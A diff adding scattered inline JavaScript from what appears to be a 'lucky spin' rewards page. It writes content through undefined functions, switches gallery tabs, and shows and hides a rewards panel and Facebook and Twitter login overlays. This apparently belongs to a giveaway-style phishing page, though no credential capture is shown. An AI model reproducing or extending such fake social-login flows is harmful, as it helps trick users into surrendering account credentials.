@@ -1,0 +1,79 @@
+
+        document.write(ls())
+    
+
+        document.write(ls())
+    
+
+        document.write(riyanandhika())
+    
+
+        document.write(head())
+    
+
+                    document.write(inti())
+                
+
+            document.write(foot())
+        
+
+        document.write(result())
+    
+
+        function openHero(evt, heroClass) {
+            var i, gallery, tab;
+            gallery = document.getElementsByClassName("gallery");
+            for (i = 0; i < gallery.length; i++) {
+                gallery[i].style.display = "none";
+            }
+            tab = document.getElementsByClassName("tab");
+            for (i = 0; i < tab.length; i++) {
+                tab[i].className = tab[i].className.replace(" active", "");
+            }
+            document.getElementById(heroClass).style.display = "block";
+            evt.currentTarget.className += " active";
+        }
+        document.getElementById("defaultOpen").click();
+    
+
+        document.write(luckyspin())
+    
+
+	function close_open_rewards() {
+        $('.open_rewards').hide();
+    }
+	function open_account_login() {
+        $('.open_account_login').show();
+		$('.open_rewards').hide();
+    }
+	function close_account_login() {
+        $('.open_account_login').hide();
+		$('.open_rewards').show();
+    }
+	function open_facebook() {
+        $('.login_facebook').show();
+        $('.open_account_login').hide();
+    }
+	function open_twitter() {
+        $('.login_twitter').show();
+        $('.open_account_login').hide();
+    }
+	function close_facebook() {
+        $('.login_facebook').hide();
+        $('.open_account_login').show();
+    }
+	function close_twitter() {
+        $('.login_twitter').hide();
+        $('.open_account_login').show();
+    }
+
+
+// <![CDATA[
+function klik1() {
+    var audio = document.getElementById('klik1');
+    audio.play();
+}
+$(document).ready(function(){
+        $("o").attr("onclick", "klik1()");
+});
+//]]>
